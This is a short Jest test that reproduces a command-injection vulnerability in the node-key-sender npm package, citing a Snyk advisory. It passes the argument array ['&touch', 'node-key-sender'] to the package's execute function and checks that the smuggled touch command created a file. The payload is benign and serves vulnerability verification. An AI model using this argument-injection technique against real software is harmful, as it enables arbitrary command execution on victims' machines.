//https://snyk.io/vuln/SNYK-JS-NODEKEYSENDER-564261
test("Command Injection in node-key-sender", () => {
  const root = require("node-key-sender");
  const fs = require("fs");
  const path = "./node-key-sender";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ["&touch", "node-key-sender"];
  root.execute(attack_code);
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
